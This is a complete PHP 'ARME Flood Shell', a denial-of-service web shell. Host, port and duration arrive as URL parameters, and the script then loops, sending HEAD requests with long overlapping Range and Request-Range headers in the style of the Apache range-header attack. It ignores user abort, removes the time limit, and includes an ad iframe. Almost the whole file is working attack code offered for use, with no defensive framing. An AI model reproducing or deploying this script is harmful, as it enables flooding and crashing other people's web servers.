<?php
ignore_user_abort(TRUE);
set_time_limit(0);
?>
<html>
<body>
<center>
<font color="#660000">
<pre>
    ______              ________  ________
   / ____/___ ___  ____/_  __/ / / / ____/
  / __/ / __ `__ \/ __ \/ / / /_/ / /     
 / /___/ / / / / / /_/ / / / __  / /___   
/_____/_/ /_/ /_/\____/_/ /_/ /_/\____/   

ARME Flood Shell
</pre>
<STYLE>
input{
background-color: #660000; font-size: 8pt; color: #00; font-family: Tahoma; border: 1 solid #66;
}
body { 
background-color: #000000;
}
</style>
<?php

   if ((!isset($_GET['time']))

   OR (!isset($_GET['port']))

   OR (!isset($_GET['host'])))

   {

      die();

   }

   $host = $_GET['host'];

   $exec_time = (int)$_GET['time'];

   $time = time();

   $max_time = $time + $exec_time;

   $p = "";

   for ($k=0;$k<50;$k++) {

   $p .= ",5-$k";

   }

   while(1)

   {

      if(time() > $max_time)

      {

         break;

      }

      if ($_GET['port'] == "rand")

      {

         $rand = rand(1,65535);

      }

      else

      {

         $rand = (int)$_GET['port'];

      }
      $fp = stream_socket_client($host.":".$rand, $errno, $errstr);
      stream_set_read_buffer($fp, 1);

      if ($fp)

      {

         $out = "HEAD / HTTP/1.1\r\n";

         $out .= "Host: {$host}\r\n";

         $out .= "User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\r\n";

         $out .= "Range:bytes=0-{$p}\r\n";

         $out .= "Request-Range:bytes=0-{$p}\r\n";

         $out .= "Accept-Encoding: gzip\r\n";

         $out .= "Connection: close\r\n\r\n";

         stream_socket_sendto($fp, $out);

      }

   }

     echo "ARME flood on {$host}:{$rand} complete after: {$exec_time} seconds";

?>
<br><br><iframe scrolling="no" style="border: 0; width: 468px; height: 60px;" src="http://coinurl.com/get.php?id=15800"></iframe>
</center>
</body>
</html> 